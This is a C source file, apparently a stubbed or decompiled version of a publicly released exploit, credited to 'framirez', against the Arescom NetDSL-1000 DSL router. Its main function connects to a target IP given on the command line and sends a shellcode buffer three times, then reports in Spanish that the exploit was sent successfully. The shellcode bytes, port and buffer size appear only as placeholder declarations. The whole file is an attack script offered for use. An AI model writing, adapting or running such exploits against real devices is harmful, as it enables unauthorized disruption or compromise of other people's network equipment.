
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






struct in_addr {int dummy; } ;
struct sockaddr_in {struct in_addr sin_addr; int sin_port; int sin_family; } ;
struct sockaddr {int dummy; } ;
struct hostent {scalar_t__ h_addr; } ;


 int AF_INET ;
 int MAXDATASIZE ;
 int PORT ;
 int SOCK_STREAM ;
 int close (int) ;
 int connect (int,struct sockaddr*,int) ;
 int exit (int) ;
 struct hostent* gethostbyname (char*) ;
 int htons (int ) ;
 int printf (char*,...) ;
 int send (int,int ,int,int ) ;
 int shellcode ;
 int socket (int ,int ,int ) ;

int main(int argc, char *argv[])
{
   int fd, numbytes,i;
   char buf[MAXDATASIZE];
   struct hostent *he;
   struct sockaddr_in server;

   printf("Exploit Arescom NetDSL-1000 executing\n");
   printf ("	 		  by framirez\n");

   if (argc !=2) {
      printf("Uso: %s <DirecciÃ³n IP>\n",argv[0]);
      exit(-1);
   }



   if ((he=gethostbyname(argv[1]))==((void*)0)){
      printf("gethostbyname() error\n");
      exit(-1);
   }

   if ((fd=socket(AF_INET, SOCK_STREAM, 0))==-1){
      printf("socket() error\n");
      exit(-1);
   }

   server.sin_family = AF_INET;
   server.sin_port = htons(PORT);
   server.sin_addr = *((struct in_addr *)he->h_addr);

   if(connect(fd, (struct sockaddr *)&server,
      sizeof(struct sockaddr))==-1){
      printf("ERROR conectando al host\n");
      exit(-1);
   }

    for (i=0;i<3;i++)
    {
    send(fd,shellcode,255,0);
    }

    printf ("Exploit enviado con EXITO al destinatario\n");
    printf ("				   by framirez\n");

   close(fd);

  return 1;
}
